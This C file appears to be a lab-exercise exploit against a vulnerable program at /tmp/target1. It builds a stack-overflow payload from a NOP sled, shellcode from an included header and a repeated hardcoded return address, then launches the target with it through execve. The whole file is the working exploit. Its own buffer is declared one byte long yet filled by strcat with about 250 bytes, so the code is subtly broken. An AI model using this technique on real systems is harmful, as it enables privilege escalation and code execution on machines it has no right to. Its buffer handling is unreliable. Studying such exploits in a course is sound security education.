#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

#define NOP "\x90"

/* hardcoded address, computed as stack address before buffer creation
   minus a certain quantity in order to point to the middle of NOPs */
#define SP "\xb0\xfc\xff\xbf"

char overflower[] = "";


int main(void)
{
  char *args[3];
  char *env[1];
  
  int i;

  // NOPs for padding
  for(i=0; i<123; i++) {
    strcat(overflower, NOP);
  }

  // shellcode
  strcat(overflower, shellcode);
  
  // repeated modified stack point address for alignment
  for(i=0; i<20; i++) {
    strcat(overflower, SP);  
  }

  args[0] = TARGET; args[1] = overflower; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

